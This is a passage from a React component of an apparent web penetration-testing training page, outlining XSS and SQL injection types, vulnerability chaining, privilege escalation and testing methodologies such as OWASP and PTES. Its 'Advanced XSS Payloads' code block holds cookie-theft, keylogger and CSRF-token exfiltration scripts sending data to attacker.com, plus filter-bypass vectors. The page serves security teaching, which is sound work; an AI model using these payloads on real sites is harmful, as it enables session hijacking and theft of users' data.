            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h5 className="font-semibold mb-3">XSS Payload Categories</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li><strong>Alert Boxes:</strong> Basic proof of concept</li>
                    <li><strong>Cookie Theft:</strong> Session hijacking payloads</li>
                    <li><strong>Keyloggers:</strong> Input capture scripts</li>
                    <li><strong>Page Defacement:</strong> Visual manipulation</li>
                    <li><strong>Redirection:</strong> Phishing attacks</li>
                    <li><strong>CSRF Tokens:</strong> Anti-CSRF bypass</li>
                    <li><strong>BeEF Hooks:</strong> Browser exploitation</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">SQL Injection Techniques</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li><strong>UNION-based:</strong> Data extraction via UNION</li>
                    <li><strong>Boolean-based:</strong> True/false response analysis</li>
                    <li><strong>Time-based:</strong> Blind injection with delays</li>
                    <li><strong>Error-based:</strong> Information through error messages</li>
                    <li><strong>Stacked Queries:</strong> Multiple statement execution</li>
                    <li><strong>Second-order:</strong> Stored payload execution</li>
                  </ul>
                </div>
              </div>
              
              <CodeExample
                language="javascript"
                title="Advanced XSS Payloads"
                code={`// Cookie theft payload
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie
</script>

// Keylogger payload
<script>
document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com/log.php?key=' + e.key);
});
</script>

// CSRF token extraction
<script>
fetch('/api/user/profile')
.then(response => response.text())
.then(data => {
    const token = data.match(/csrf_token.*?value="([^"]+)"/)[1];
    fetch('http://attacker.com/csrf.php?token=' + token);
});
</script>

// DOM-based XSS
<script>
const params = new URLSearchParams(window.location.search);
document.getElementById('content').innerHTML = params.get('message');
</script>

// Filter bypass techniques
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<details open ontoggle=alert(1)>`}
              />
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="vulnerability-chaining">
            <AccordionTrigger className="text-lg font-semibold">
              Vulnerability Chaining
            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h5 className="font-semibold mb-3">Common Chains</h5>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>CSRF + XSS:</strong> Cross-site request forgery via XSS</li>
                    <li><strong>IDOR + Information Disclosure:</strong> Data access escalation</li>
                    <li><strong>XXE + SSRF:</strong> Internal network access</li>
                    <li><strong>File Upload + Path Traversal:</strong> Arbitrary file write</li>
                    <li><strong>SQLi + File Write:</strong> Web shell deployment</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Attack Scenarios</h5>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>Account Takeover:</strong> Multi-step user compromise</li>
                    <li><strong>Privilege Escalation:</strong> User to admin access</li>
                    <li><strong>Data Exfiltration:</strong> Systematic data theft</li>
                    <li><strong>Persistent Access:</strong> Backdoor establishment</li>
                  </ul>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="privilege-escalation">
            <AccordionTrigger className="text-lg font-semibold">
              Privilege Escalation Methods
            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div>
                  <h5 className="font-semibold mb-3">Horizontal Escalation</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>IDOR attacks</li>
                    <li>Session token manipulation</li>
                    <li>Parameter tampering</li>
                    <li>Forced browsing</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Vertical Escalation</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Role manipulation</li>
                    <li>Function bypass</li>
                    <li>Administrative interface access</li>
                    <li>Privilege bit flipping</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Environment-Specific</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Container escape</li>
                    <li>Cloud metadata access</li>
                    <li>Serverless function abuse</li>
                    <li>Microservice traversal</li>
                  </ul>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>
        </Accordion>
      </div>

      {/* Methodology Frameworks */}
      <div className="card">
        <h3 className="text-2xl font-bold mb-6 flex items-center gap-2">
          <BookOpen className="h-7 w-7 text-cybr-primary" />
          Professional Testing Methodologies
        </h3>
        
        <Accordion type="single" collapsible className="space-y-4">
          <AccordionItem value="owasp-guide">
            <AccordionTrigger className="text-lg font-semibold">
              OWASP Web Security Testing Guide (WSTG)
            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h5 className="font-semibold mb-3">Testing Categories</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li><strong>WSTG-INFO:</strong> Information Gathering</li>
                    <li><strong>WSTG-CONF:</strong> Configuration and Deployment Management</li>
                    <li><strong>WSTG-IDNT:</strong> Identity Management</li>
                    <li><strong>WSTG-ATHN:</strong> Authentication</li>
                    <li><strong>WSTG-AUTHZ:</strong> Authorization</li>
                    <li><strong>WSTG-SESS:</strong> Session Management</li>
                    <li><strong>WSTG-INPV:</strong> Input Validation</li>
                    <li><strong>WSTG-ERRH:</strong> Error Handling</li>
                    <li><strong>WSTG-CRYP:</strong> Cryptography</li>
                    <li><strong>WSTG-BUSLOGIC:</strong> Business Logic</li>
                    <li><strong>WSTG-CLIENT:</strong> Client-side Testing</li>
                    <li><strong>WSTG-APIT:</strong> API Testing</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">OWASP Top 10 Mapping</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li><strong>A01:2021:</strong> Broken Access Control</li>
                    <li><strong>A02:2021:</strong> Cryptographic Failures</li>
                    <li><strong>A03:2021:</strong> Injection</li>
                    <li><strong>A04:2021:</strong> Insecure Design</li>
                    <li><strong>A05:2021:</strong> Security Misconfiguration</li>
                    <li><strong>A06:2021:</strong> Vulnerable Components</li>
                    <li><strong>A07:2021:</strong> Identification & Authentication</li>
                    <li><strong>A08:2021:</strong> Software & Data Integrity</li>
                    <li><strong>A09:2021:</strong> Security Logging</li>
                    <li><strong>A10:2021:</strong> Server-Side Request Forgery</li>
                  </ul>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="ptes">
            <AccordionTrigger className="text-lg font-semibold">
              PTES (Penetration Testing Execution Standard)
            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h5 className="font-semibold mb-3">PTES Phases</h5>
                  <ol className="list-decimal pl-6 space-y-2">
                    <li><strong>Pre-engagement Interactions:</strong> Scope definition, legal agreements</li>
                    <li><strong>Intelligence Gathering:</strong> OSINT, reconnaissance</li>
                    <li><strong>Threat Modeling:</strong> Attack vector identification</li>
                    <li><strong>Vulnerability Analysis:</strong> Security flaw identification</li>
                    <li><strong>Exploitation:</strong> Vulnerability confirmation</li>
                    <li><strong>Post Exploitation:</strong> Impact assessment</li>
                    <li><strong>Reporting:</strong> Findings documentation</li>
                  </ol>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Risk Rating Framework</h5>
                  <div className="space-y-2">
                    <div className="p-2 bg-red-900/20 border border-red-500 rounded">
                      <strong className="text-red-400">Critical:</strong> Immediate threat to business
                    </div>
                    <div className="p-2 bg-orange-900/20 border border-orange-500 rounded">
                      <strong className="text-orange-400">High:</strong> Significant security risk
                    </div>
                    <div className="p-2 bg-yellow-900/20 border border-yellow-500 rounded">
                      <strong className="text-yellow-400">Medium:</strong> Moderate security concern
                    </div>
                    <div className="p-2 bg-blue-900/20 border border-blue-500 rounded">
                      <strong className="text-blue-400">Low:</strong> Minor security issue
                    </div>
                    <div className="p-2 bg-green-900/20 border border-green-500 rounded">
                      <strong className="text-green-400">Info:</strong> Informational finding
                    </div>
                  </div>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="osstmm">
            <AccordionTrigger className="text-lg font-semibold">
              OSSTMM (Open Source Security Testing Methodology)
            </AccordionTrigger>
            <AccordionContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h5 className="font-semibold mb-3">Scientific Approach</h5>
                  <ul className="list-disc pl-6 space-y-1">
                    <li><strong>Reproducible Results:</strong> Consistent testing methodology</li>
                    <li><strong>Measurable Security:</strong> Quantitative analysis</li>
                    <li><strong>Trust Analysis:</strong> Security vs functionality balance</li>
                    <li><strong>Operational Controls:</strong> Real-world security effectiveness</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Testing Channels</h5>
                  <ul className="list-disc pl-6 space-y-1">
                    <li><strong>Human Security:</strong> Social engineering, physical access</li>
                    <li><strong>Physical Security:</strong> Facility and hardware security</li>
                    <li><strong>Wireless Security:</strong> RF communications security</li>
                    <li><strong>Telecommunications:</strong> Voice and data communications</li>
                    <li><strong>Data Networks:</strong> Network infrastructure security</li>
                  </ul>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>
        </Accordion>
      </div>

      {/* Additional Resources */}
      <div className="card">
        <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <AlertTriangle className="h-7 w-7 text-cybr-primary" />
          Professional Considerations
        </h3>
        
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          <div>
            <h4 className="font-semibold mb-3 text-cybr-primary">Legal & Ethical</h4>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li>Written authorization required</li>
              <li>Scope limitations and boundaries</li>
              <li>Data protection compliance</li>
              <li>Responsible disclosure practices</li>
              <li>Liability and insurance considerations</li>
            </ul>
          </div>
          
          <div>
            <h4 className="font-semibold mb-3 text-cybr-primary">Documentation</h4>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li>Detailed methodology description</li>
              <li>Step-by-step reproduction guides</li>
              <li>Evidence collection and preservation</li>
              <li>Executive and technical reporting</li>
              <li>Remediation recommendations</li>
            </ul>
          </div>
          
          <div>
            <h4 className="font-semibold mb-3 text-cybr-primary">Quality Assurance</h4>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li>Peer review processes</li>
              <li>False positive validation</li>
              <li>Impact assessment accuracy</li>
              <li>Client communication protocols</li>
              <li>Continuous methodology improvement</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
};

export default TestingTechniquesSection;
